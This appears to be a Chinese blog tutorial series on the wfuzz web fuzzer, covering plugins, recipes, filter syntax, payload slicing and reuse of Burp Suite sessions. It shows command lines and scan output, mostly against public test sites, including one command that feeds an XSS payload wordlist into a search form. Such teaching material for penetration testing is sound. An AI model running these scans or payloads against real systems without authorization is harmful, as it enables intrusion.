<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz --script=robots -z list,robots.txt http://www.webscantest.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.webscantest.com/FUZZ</span><br><span class="line">Total requests: 1</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=200      6 L	      10 W	    101 Ch	  &quot;robots.txt&quot;</span><br><span class="line"> |_  Plugin robots enqueued 4 more requests (rlevel=1)</span><br><span class="line">000002:  C=200     40 L	     117 W	   1528 Ch	  &quot;/osrun/&quot;</span><br><span class="line">000003:  C=200     55 L	     132 W	   1849 Ch	  &quot;/cal_endar/&quot;</span><br><span class="line">000004:  C=200     40 L	     123 W	   1611 Ch	  &quot;/crawlsnags/&quot;</span><br><span class="line">000005:  C=200     85 L	     197 W	   3486 Ch	  &quot;/static/&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.709153</span><br><span class="line">Processed Requests: 5 (1 + 4)</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 2.925424</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="自定义插件"><a href="#自定义插件" class="headerlink" title="自定义插件"></a>自定义插件</h4><p>用户自己开发的脚本插件，应放在如下目录下：<code>~/.wfuzz/scripts</code></p>
<hr>
<h3 id="Recipes-菜谱"><a href="#Recipes-菜谱" class="headerlink" title="Recipes(菜谱)"></a>Recipes(菜谱)</h3><p>我们可以将wfuzz使用的选项保存成文档，方便下次执行和分享。</p>
<p>要生成一个recipes，使用下面的命令：<br><code>$ wfuzz --script=robots -z list,robots.txt --dump-recipe /tmp/recipes http://www.webscantest.com/FUZZ</code></p>
<p>要使用已经保存下来的recipes，对需要传递<code>--recipe</code>参数：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz --recip /tmp/recipes</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://www.webscantest.com/FUZZ</span><br><span class="line">Total requests: 1</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=200      6 L	      10 W	    101 Ch	  &quot;robots.txt&quot;</span><br><span class="line"> |_  Plugin robots enqueued 4 more requests (rlevel=1)</span><br><span class="line">000002:  C=200     40 L	     117 W	   1528 Ch	  &quot;/osrun/&quot;</span><br><span class="line">000003:  C=200     55 L	     132 W	   1849 Ch	  &quot;/cal_endar/&quot;</span><br><span class="line">000004:  C=200     40 L	     123 W	   1611 Ch	  &quot;/crawlsnags/&quot;</span><br><span class="line">000005:  C=200     85 L	     197 W	   3486 Ch	  &quot;/static/&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.700331</span><br><span class="line">Processed Requests: 5 (1 + 4)</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 2.940602</span><br></pre></td></tr></table></figure>

<hr>
<h3 id="扫描模式"><a href="#扫描模式" class="headerlink" title="扫描模式"></a>扫描模式</h3><p>当出现网络问题，如DNS解析失败，拒绝连接等时，wfuzz会抛出一个异常并停止执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,support-web-none http://FUZZ.baidu.com/</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://FUZZ.baidu.com/</span><br><span class="line">Total requests: 3</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Fatal exception: Pycurl error 6: Could not resolve host: none.baidu.com</span><br></pre></td></tr></table></figure>
<p>当我们使用<code>-Z</code>参数时，wfuzz就会忽略这些网络错误而继续执行：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,support-none -Z http://FUZZ.baidu.com/</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://FUZZ.baidu.com/</span><br><span class="line">Total requests: 2</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=200   1485 L	    3794 W	  128348 Ch	  &quot;support&quot;</span><br><span class="line">000002:  C=XXX      0 L	       0 W	      0 Ch	  &quot;none! Pycurl error 6: Could not resolve host: none.baidu.com&quot;</span><br><span class="line"></span><br><span class="line">Total time: 3.401754</span><br><span class="line">Processed Requests: 2</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 0.587931</span><br></pre></td></tr></table></figure>
<p>出现错误的payload会以返回码<code>XXX</code>来表示，Payload中还有出现的错误。</p>
<p>理论上，我们就可以根据这个进行过滤，但是不知为什么并不会将产生错误的结果过滤掉。<br><code>$ wfuzz -z list,support-none --hc XXX -Z http://FUZZ.baidu.com/</code></p>
<hr>
<h4 id="超时"><a href="#超时" class="headerlink" title="超时"></a>超时</h4><p>使用<code>--conn-delay</code>来设置wfuzz等待web server响应接连的秒数。<br>使用<code>--req-delay</code>来设置wfuzz等待响应完成的最大秒数。<br>这些功能有时候会很有用，比如使用代理&#x2F;某个端口&#x2F;主机名&#x2F;虚拟主机进行扫描时。</p>
<hr>
<h3 id="过滤器语法"><a href="#过滤器语法" class="headerlink" title="过滤器语法"></a>过滤器语法</h3><p>wfuzz的过滤器是基于<a href="http://pyparsing.wikispaces.com/" title="pyparsing">pyparsing</a>开发的，所以在使用<code>--filter</code>，<code>--prefilter</code>，<code>--slice</code>之前，请先安装上<code>pyparsing</code>。</p>
<p>一个过滤器表达式必须使用由以下符号或操作符构成：</p>
<ul>
<li>Boolean Operators 是非操作符：<code>and</code>，<code>or</code>，<code>not</code></li>
<li>Expression Operators 逻辑操作符：<code>=</code>，<code>!=</code>，<code>&lt;</code>，<code>&gt;</code>，<code>&gt;=</code>，<code>&lt;=</code>，除此之外，还有下列用于文本的操作符：</li>
</ul>
<table>
<thead>
<tr>
<th>Operator</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>&#x3D;~</td>
<td>符合正则表达式则为True</td>
</tr>
<tr>
<td>~</td>
<td>等同于Python语法中的 “str2” in “str1”，不区分大小写</td>
</tr>
<tr>
<td>!~</td>
<td>与上面一条相反，“str2” not in “str1”，不区分大小写</td>
</tr>
</tbody></table>
<p>取值规则如下：</p>
<ul>
<li>基本规则</li>
</ul>
<table>
<thead>
<tr>
<th>Long Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>‘string’</td>
<td>转码后的字符串</td>
</tr>
<tr>
<td>0..9+</td>
<td>数字</td>
</tr>
<tr>
<td>XXX</td>
<td>HTTP请求的错误码</td>
</tr>
<tr>
<td>BBB</td>
<td>Baseline</td>
</tr>
</tbody></table>
<ul>
<li>值还可以使用下面的操作符进行修改</li>
</ul>
<table>
<thead>
<tr>
<th>Name</th>
<th>Short version</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>value&amp;#124;unquote()</td>
<td>value&amp;#124;un()</td>
<td>将值转换为未编码的值</td>
</tr>
<tr>
<td>value&amp;#124;lower()</td>
<td>value&amp;#124;l()</td>
<td>将值转换为小写</td>
</tr>
<tr>
<td>value&amp;#124;upper()</td>
<td></td>
<td>将值轮换为大写</td>
</tr>
<tr>
<td>value&amp;#124;encode(‘encoder’,’value’)</td>
<td>value&amp;#124;e(‘enc’,’val’)</td>
<td>返回encoder.encode(value)</td>
</tr>
<tr>
<td>value&amp;#124;decode(‘decoder’,’value’)</td>
<td>value&amp;#124;d(‘dec’,’val’)</td>
<td>返回encoder.decode(value)</td>
</tr>
<tr>
<td>value&amp;#124;replace(‘what’,’with’)</td>
<td>value&amp;#124;r(‘what’,’with’)</td>
<td>返回用with替换what后的值</td>
</tr>
<tr>
<td>value&amp;#124;unique(value)</td>
<td>value&amp;#124;u(value)</td>
<td>如果value唯一返回True</td>
</tr>
<tr>
<td>value&amp;#124;startswith(‘param’)</td>
<td>value&amp;#124;sw(‘param’)</td>
<td>如果value以param开头返回True</td>
</tr>
</tbody></table>
<ul>
<li>如果wfuzz结果可用，那么还可以在运行时使用以下操作符进行检测</li>
</ul>
<table>
<thead>
<tr>
<th>Name</th>
<th>Short version</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>description</td>
<td></td>
<td>wfuzz结果的描述</td>
</tr>
<tr>
<td>nres</td>
<td></td>
<td>wfuzz结果的识别码</td>
</tr>
<tr>
<td>code</td>
<td>c</td>
<td>HTTP返回码</td>
</tr>
<tr>
<td>chars</td>
<td>h</td>
<td>wfuzz结果的HTTP返回字符数</td>
</tr>
<tr>
<td>lines</td>
<td>l</td>
<td>wfuzz结果的HTTP返回行数</td>
</tr>
<tr>
<td>words</td>
<td>w</td>
<td>wfuzz结果的HTTP返回字数</td>
</tr>
<tr>
<td>md5</td>
<td></td>
<td>wfuzz结果的HTTP返回的md5值</td>
</tr>
</tbody></table>
<ul>
<li>或者，wfuzz请求对象的属性：</li>
</ul>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>url</td>
<td>HTTP请求的值</td>
</tr>
<tr>
<td>method</td>
<td>HTTP请求的方法（动词）</td>
</tr>
<tr>
<td>scheme</td>
<td>HTTP请求的协议</td>
</tr>
<tr>
<td>host</td>
<td>HTTP请求的主机</td>
</tr>
<tr>
<td>content</td>
<td>HTTP响应的响应体</td>
</tr>
<tr>
<td>raw_content</td>
<td>包括HTTP头的HTTP响应体</td>
</tr>
<tr>
<td>cookies.request</td>
<td>请求的cookie</td>
</tr>
<tr>
<td>cookies.response</td>
<td>响应的cookie</td>
</tr>
<tr>
<td>cookies.request.&amp;#60;&amp;#60;name&amp;#62;&amp;#62;</td>
<td>请求的cookie</td>
</tr>
<tr>
<td>cookies.response.&amp;#60;&amp;#60;name&amp;#62;&amp;#62;</td>
<td>响应的cookie</td>
</tr>
<tr>
<td>headers.request</td>
<td>所有的HTTP请求头</td>
</tr>
<tr>
<td>headers.response</td>
<td>所有的HTTP响应头</td>
</tr>
<tr>
<td>headers.request.&amp;#60;&amp;#60;name&amp;#62;&amp;#62;</td>
<td>某个请求头</td>
</tr>
<tr>
<td>headers.response.&amp;#60;&amp;#60;name&amp;#62;&amp;#62;</td>
<td>某个响应头</td>
</tr>
<tr>
<td>params</td>
<td>所有HTTP请求的GET和POST参数</td>
</tr>
<tr>
<td>params.get</td>
<td>所有的GET请求参数</td>
</tr>
<tr>
<td>params.post</td>
<td>所有的POST请求参数</td>
</tr>
<tr>
<td>params.get&#x2F;post.&amp;#60;&amp;#60;name&amp;#62;&amp;#62;</td>
<td>某个GET&#x2F;POST请求参数</td>
</tr>
</tbody></table>
<p>一个URL在经过<code>urlparse</code>模块解析之后，会被解析成很多小部分，格式为：<code>scheme://netloc/path;parameters?query#fragment</code><br>举例来说，<code>http://www.google.com/dir/test.php?id=1</code>这个经过解析之后，我们可以得到如下值：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Value</th>
</tr>
</thead>
<tbody><tr>
<td>url.scheme</td>
<td>http</td>
</tr>
<tr>
<td>url.netloc</td>
<td><a href="http://www.google.com/">www.google.com</a></td>
</tr>
<tr>
<td>url.path</td>
<td>&#x2F;dir&#x2F;test.php</td>
</tr>
<tr>
<td>url.params</td>
<td></td>
</tr>
<tr>
<td>url.query</td>
<td>id&#x3D;1</td>
</tr>
<tr>
<td>url.fragment</td>
<td></td>
</tr>
<tr>
<td>url.domain</td>
<td>google.com</td>
</tr>
<tr>
<td>url.ffname</td>
<td>test.php</td>
</tr>
<tr>
<td>url.fext</td>
<td>.php</td>
</tr>
<tr>
<td>url.fname</td>
<td>test</td>
</tr>
<tr>
<td>url.pstrip</td>
<td>返回使用去掉值之后的参数名来生成这个请求的哈希值</td>
</tr>
<tr>
<td>url.hasquery</td>
<td>如果URL中有查询字段则返回True</td>
</tr>
<tr>
<td>url.ispath</td>
<td>如果URL指向的是一个文件夹则返回True</td>
</tr>
<tr>
<td>url.isbllist</td>
<td>如果一个URL的文件后缀在全局设置中的黑名单中则返回True</td>
</tr>
</tbody></table>
<p>使用FUZZ占位符还可以对Payload进行检查：</p>
<table>
<thead>
<tr>
<th>Name</th>
<th>Description</th>
</tr>
</thead>
<tbody><tr>
<td>FUZnZ</td>
<td>指向第n个payload字符串</td>
</tr>
<tr>
<td>FUZnZ[field]</td>
<td>指向第n个payload的属性</td>
</tr>
</tbody></table>
<p>属性即上面描述的（这里这个Field没看懂…）</p>
<hr>
<h3 id="过滤结果"><a href="#过滤结果" class="headerlink" title="过滤结果"></a>过滤结果</h3><p>使用<code>--filter</code>参数加上上面的过滤器语法，我们可以写出比<code>--hc/hl/hw/hh</code>，<code>--sc/sl/sw/sh</code>和<code>--ss/hs</code>更加复杂和精细的过滤条件。<br>看下面的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z range,0-10 --filter &quot;c=200 and l&gt;97&quot; http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/listproducts.php?cat=FUZZ</span><br><span class="line">Total requests: 11</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000003:  C=200     99 L	     302 W	   4442 Ch	  &quot;2&quot;</span><br><span class="line"></span><br><span class="line">Total time: 1.222108</span><br><span class="line">Processed Requests: 11</span><br><span class="line">Filtered Requests: 10</span><br><span class="line">Requests/sec.: 9.000840</span><br></pre></td></tr></table></figure>

<p>利用输出结果和payload检查来找出含有某些特定内容的返回体：<br><code>$ wfuzz -z list,echoedback -d searchFor=FUZZ --filter &quot;content~FUZZ&quot; http://testphp.vulnweb.com/search.php?test=query</code></p>
<p>上面的命令与这条命令等价：<br><code>$ wfuzz -z list,echoedback -d searchFor=FUZZ --ss &quot;echoedback&quot; http://testphp.vulnweb.com/search.php?test=query</code></p>
<p>另一条更有意思的变形如下：<br><code>$ wfuzz -w fuzzdb/attack/xss/xss-rsnake.txt -d searchFor=FUZZ --filter &quot;intext~FUZZ&quot; http://testphp.vulnweb.com/search.php?test=query</code></p>
<hr>
<h3 id="过滤payload"><a href="#过滤payload" class="headerlink" title="过滤payload"></a>过滤payload</h3><hr>
<h4 id="切片"><a href="#切片" class="headerlink" title="切片"></a>切片</h4><p>使用<code>--slice</code>参数，结合过滤器语法，我们可以对payload进行过滤。<code>--slice</code>参数必须在<code>-z</code>参数后。<br>看下面的例子：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[~/.wfuzz]</span><br><span class="line">└──╼ $wfuzz -z list,one-two-one-one --slice &quot;FUZZ|u()&quot; http://localhost/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://localhost/FUZZ</span><br><span class="line">Total requests: &lt;&lt;unknown&gt;&gt;</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000001:  C=404      9 L	      32 W	    276 Ch	  &quot;one&quot;</span><br><span class="line">000002:  C=404      9 L	      32 W	    276 Ch	  &quot;two&quot;</span><br><span class="line"></span><br><span class="line">Total time: 0.095625</span><br><span class="line">Processed Requests: 2</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 20.91499</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="预过滤"><a href="#预过滤" class="headerlink" title="预过滤"></a>预过滤</h4><p><code>--prefilter</code>参数与<code>--slice</code>相似，不过它并没有和任何payload相关。它是一个通用的过滤，在HTTP请求发送之前进行。<br>在这种上下文环境中，我们是在对一个FuzzResult对象进行过滤，这个对象包括所有输入的payload，且没有被与它相关连的HTTP响应更新，所以是缺少一些信息的。</p>
<hr>
<h4 id="输出结果再利用"><a href="#输出结果再利用" class="headerlink" title="输出结果再利用"></a>输出结果再利用</h4><p>之前获得的HTTP请求&#x2F;响应中包含很多有价值的数据。<br>利用已经得到的数据，我们可以进行下列方面的挖掘：</p>
<ul>
<li>单个请求重放</li>
<li>对比测试请求与正常请求中的响应体中的头和体</li>
<li>从请求中查找URL中带有CSRF token的请求</li>
<li>从返回中查找返回体为Json内容但返回头的content-type设置错误。</li>
</ul>
<p>为了能够使用之前得到的结果，我们需要使用能够生成完整FuzzResult对象的payload。</p>
<ul>
<li><p>wfuzzp payload<br> wfuzz结果可以通过使用<code>-oF</code>参数进行保存：<br>  <code>$ wfuzz --oF /tmp/session -z range,0-10 http://www.baidu.com/dir/test.php?id=FUZZ </code></p>
</li>
<li><p>burpstate 和 burplog payload:<br> wfuzz能够读取burpsuite保存的state和日记文档，使得我们能够重复利用能够burpsuite代理生成的请求和响应信息。<br>  要重放burp保存的请求，我们需要在命令行中使用FUZZ占位符：</p>
  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wfuzz -z burpstate,a_burp_state.burp FUZZ</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wfuzz -z burplog,a_burp_log.burp FUZZ</span></span><br><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wfuzz -z wfuzzp,/tmp/session FUZZ</span></span><br></pre></td></tr></table></figure></li>
</ul>
<p> 之前的请求还能够像平时那样通过命令行参数进行更改，比如：</p>
<ul>
<li>增加新的header：<br>  <code>$ wfuzz -z burpstate,a_burp_state.burp -H &quot;addme: header&quot; FUZZ</code></li>
<li>使用新的cookie：<br>  <code>$ wfuzz -z burpstate,a_burp_state.burp -z list,1-2-3 -b &quot;cookie=FUZ2Z&quot; FUZZ</code></li>
<li>已经保存的HTTP请求还可以通过<code>--prev</code>参数被打印出来与新的结果进行比较：  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wfuzz -z burpstate,testphp.burp --slice <span class="string">&quot;cookies.request and url|u()&quot;</span> --filter <span class="string">&quot;c!=FUZZ[c]&quot;</span> -b <span class="string">&quot;&quot;</span> --prev FUZZ</span></span><br><span class="line">...</span><br><span class="line">000076:  C=302      0 L        3 W           14 Ch        &quot;http://testphp.vulnweb.com/userinfo.php&quot;</span><br><span class="line">  |__    C=200    114 L      373 W         5347 Ch        &quot;http://testphp.vulnweb.com/userinfo.php&quot;</span><br></pre></td></tr></table></figure></li>
<li>将相同的请求发送到另一个URL上：<br>  <code>$ wfuzz -z burpstate,a_burp_state.burp -H &quot;addme: header&quot; -u http://www.otherhost.com FUZZ</code></li>
</ul>
<p>如果不想使用保存的所有请求：</p>
<ul>
<li><p>使用<code>attr</code>我们可以获得一些特定的HTTP对象内容：<br> <code>$ wfuzz -z wfuzzp,/tmp/session --zP attr=url FUZZ</code></p>
</li>
<li><p>或者，通过<code>FUZZ[field]</code>的方式：<br> <code>$ wfuzz -z wfuzzp,/tmp/session FUZZ[url]</code></p>
</li>
</ul>
<p> 比如，我们可以在保存的值的基础上发送新的请求：<br>  <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">$ </span><span class="language-bash">wfuzz -z wfuzzp,/tmp/session -p localhost:8080 http://testphp.vulnweb.com/FUZZ[url.path]?FUZZ[url.query]</span></span><br><span class="line">00001:  C=200     25 L       155 W         1362 Ch        &quot;/dir/test.php - id=0&quot;</span><br><span class="line">...</span><br><span class="line">00002:  C=200     25 L       155 W         1362 Ch        &quot;/dir/test.php - id=1&quot;</span><br></pre></td></tr></table></figure><br>上述命令产生的HTTP请求如下 ：<br>​		GET &#x2F;dir&#x2F;test.php?id&#x3D;10 HTTP&#x2F;1.1<br>​		Host: testphp.vulnweb.com<br>​		Accept: <em>&#x2F;</em><br>​		Content-Type:  application&#x2F;x-www-form-urlencoded<br>​		User-Agent:  Wfuzz&#x2F;2.2<br>​		Connection: close</p>
]]></content>
      <categories>
        <category>web-sec</category>
      </categories>
  </entry>
  <entry>
    <title>史上最详[ZI]细[DUO]的wfuzz中文教程（一）——初识wfuzz</title>
    <url>/web-sec/%E5%8F%B2%E4%B8%8A%E6%9C%80%E8%AF%A6%5BZI%5D%E7%BB%86%5BDUO%5D%E7%9A%84wfuzz%E4%B8%AD%E6%96%87%E6%95%99%E7%A8%8B%EF%BC%88%E4%B8%80%EF%BC%89%E2%80%94%E2%80%94%E5%88%9D%E8%AF%86wfuzz.html</url>
    <content><![CDATA[<blockquote>
<blockquote>
<p>本文已在丁牛网安实验室FreeBuf专栏 <a href="http://www.freebuf.com/column/163553.html" title="DigApis安全">DigApis安全</a> 中首发！引用转发请注明 “原文来自：DigApis安全 m0nst3r”字样，谢谢！</p>
</blockquote>
</blockquote>
<p>[TOC]</p>
<hr>
<h2 id="wfuzz教程"><a href="#wfuzz教程" class="headerlink" title="wfuzz教程"></a>wfuzz教程</h2><p>这个教程主要内容是来自<a href="http://wfuzz.readthedocs.io/" title="wfuzz官方文档">wfuzz官方文档</a>。之所以写这个，是因为大多数的国内文章并没有对这个工具进行详细的说明。个人英文还算可以，所以抖胆翻译一下，加上自己的一些操作，一方面加深下自己对这个工具的熟练程度，另一方面方便广大初学者学习。<br>感觉这个工具比平时使用的御剑灵活很多（如果参数都弄明白的话），总之，作为渗透测试信息收集的一个环节，它还是有用武之地的。</p>
<p>这个教程本来想弄一篇文章，但是实在是太多了，所以借鉴了一下官方文档的分节，把这个教程做成了一个系列，一共四个部分，分别是：</p>
<ul>
<li><p>初识wfuzz：看完这个，你应该可以使用比较简单的命令来做一些任务了。</p>
</li>
<li><p>wfuzz 基本用法：看完这个的话，你应该可以从容使用wfuzz来做一些常用扫描器做不了的活，而且觉得wfuzz是个好东西。</p>
</li>
<li><p>wfuzz 高级用法：看完这个，你应该就可以玩弄wfuzz于手掌之中，各种小姿势让你在别人扫不成的时候装装X。</p>
</li>
<li><p>wfuzz 库：看完这个，不，能去仔细学习这个的同学，我就不说了，此类人圈内统称”大婊哥“，小弟在这只是抛砖引玉了。</p>
</li>
</ul>
<hr>
<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>wfuzz 是一款Python开发的Web安全测试工具<br>wfuzz不仅仅是一个web扫描器：</p>
<ul>
<li><p>wfuzz能够通过发现并利用网站弱点&#x2F;漏洞的方式帮助你使网站更加安全。wfuzz的漏洞扫描功能由插件支持。</p>
</li>
<li><p>wfuzz是一个完全模块化的框架，这使得即使是Python初学者也能够进行开发和贡献代码。开发一个wfuzz插件是一件非常简单的事，通常只需几分钟。</p>
</li>
<li><p>wfuzz提供了简洁的编程语言接口来处理wfuzz或Burpsuite获取到的HTTP请求和响应。这使得你能够在一个良好的上下文环境中进行手工测试或半自动化的测试，而不需要依赖web形式的扫描器。</p>
</li>
</ul>
<hr>
<h3 id="初识wfuzz"><a href="#初识wfuzz" class="headerlink" title="初识wfuzz"></a>初识wfuzz</h3><hr>
<h4 id="最简单命令"><a href="#最简单命令" class="headerlink" title="最简单命令"></a>最简单命令</h4><p>一个典型的wfuzz命令只需要指定一个字典和一个要测试的URL即可，如下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/src/wfuzz]</span><br><span class="line">└──╼ $wfuzz -w /usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 2.2.9 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://testphp.vulnweb.com/FUZZ</span><br><span class="line">Total requests: 950</span><br><span class="line"></span><br><span class="line">==================================================================</span><br><span class="line">ID	Response   Lines      Word         Chars          Payload    </span><br><span class="line">==================================================================</span><br><span class="line"></span><br><span class="line">000223:  C=404      7 L	      12 W	    168 Ch	  &quot;constants&quot;</span><br><span class="line">000224:  C=404      7 L	      12 W	    168 Ch	  &quot;contact&quot;</span><br><span class="line">000225:  C=404      7 L	      12 W	    168 Ch	  &quot;contacts&quot;</span><br><span class="line">000230:  C=404      7 L	      12 W	    168 Ch	  &quot;controlpanel&quot;</span><br><span class="line">000226:  C=404      7 L	      12 W	    168 Ch	  &quot;content&quot;</span><br><span class="line">000227:  C=404      7 L	      12 W	    168 Ch	  &quot;contents&quot;</span><br><span class="line">000228:  C=404      7 L	      12 W	    168 Ch	  &quot;control&quot;</span><br><span class="line">...</span><br><span class="line">000008:  C=404      7 L	      12 W	    168 Ch	  &quot;100&quot;</span><br><span class="line"></span><br><span class="line">Total time: 5.193345</span><br><span class="line">Processed Requests: 950</span><br><span class="line">Filtered Requests: 0</span><br><span class="line">Requests/sec.: 182.9264</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>wfuzz的输出使我们能够分析web server的响应，还可根据获得的HTTP响应信息过滤出我们想要的结果，比如过滤响应码&#x2F;响应长度等等。</p>
<p>每一行输出给我们提供了以下信息：</p>
<ul>
<li>ID：测试时的请求序号</li>
<li>Response：HTTP响应吗</li>
<li>Lines：响应信息中的行数</li>
<li>Word：响应信息中的字数</li>
<li>Chars：响应信息中的字符数</li>
<li>Payload：当前使用的payload</li>
</ul>
<hr>
<h4 id="获取帮助信息"><a href="#获取帮助信息" class="headerlink" title="获取帮助信息"></a>获取帮助信息</h4><p>使用<code>-h</code>和<code>--help</code>参数来获取基本帮助信息和详细帮助信息。<br>wfuzz是一个完全模块化的模式，你可以使用<code>-e &lt;&lt;category&gt;&gt;</code>参数查看其中可用的模块，例如：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/src/wfuzz]</span><br><span class="line">└──╼ $wfuzz -e iterators</span><br><span class="line"></span><br><span class="line">Available iterators:</span><br><span class="line"></span><br><span class="line">  Name    | Summary                                                                           </span><br><span class="line">----------------------------------------------------------------------------------------------</span><br><span class="line">  product | Returns an iterator cartesian product of input iterables.                         </span><br><span class="line">  zip     | Returns an iterator that aggregates elements from each of the iterables.          </span><br><span class="line">  chain   | Returns an iterator returns elements from the first iterable until it is exhaust  </span><br><span class="line">         	 | ed, then proceeds to the next iterable, until all of the iterables are exhausted  </span><br><span class="line">          	| .                                                                                 </span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>可用的categories包括：<code>payloads</code>,<code>encoders</code>,<code>iterators</code>,<code>printers</code>和<code>scripts</code>。</p>
<hr>
<h4 id="Payloads"><a href="#Payloads" class="headerlink" title="Payloads"></a>Payloads</h4><p>wfuzz基于一个非常简单的概念：它用一个给定的payload来替换相应的FUZZ关键词的值，我们称FUZZ这样的关键词为<code>占位符</code>，这样更容易理解。一个wfuzz中的payload就是一个输入的源。</p>
<p>要想得到所有可用的payload列表，可以执行如下命令：<br><code>$ wfuzz -e payloads</code></p>
<p>关于payloads的更详细的信息可以通过以下命令获取：<br><code>$ wfuzz -z help</code></p>
<p>上面这个命令还可以使用<code>--slice</code>参数来对输出结果进行过滤：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">┌─[michael@parrot]─[/usr/share/wfuzz/src/wfuzz]</span><br><span class="line">└──╼ $wfuzz -z help --slice &quot;dirwalk&quot;</span><br><span class="line">Name: dirwalk 0.1</span><br><span class="line">Categories: default</span><br><span class="line">Summary: Returns filename&#x27;s recursively from a local directory.</span><br><span class="line">Author: Xavi Mendez (@xmendez)</span><br><span class="line">Description:</span><br><span class="line">   Returns all the file paths found in the specified directory.</span><br><span class="line">   Handy if you want to check a directory structure against a webserver,</span><br><span class="line">   for example, because you have previously downloaded a specific version</span><br><span class="line">   of what is supposed to be on-line.</span><br><span class="line">Parameters:</span><br><span class="line">   + dir: Directory path to walk and generate payload from.</span><br></pre></td></tr></table></figure>

<hr>
<h4 id="指定一个payload"><a href="#指定一个payload" class="headerlink" title="指定一个payload"></a>指定一个payload</h4><p>每个FUZZ占位符都必须为它指定相应的payload。指定一个payload时有几种方法：</p>
<ul>
<li>命令比较长的方式是显式的定义payload的参数:<br>  <code>$ wfuzz -z file --zP fn=/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></li>
<li>另一个不太长的方式是只提供payload所需的默认参数：<br>  <code>$ wfuzz -z file,/usr/share/wfuzz/wordlist/general/common.txt http://testphp.vulnweb.com/FUZZ</code></li>
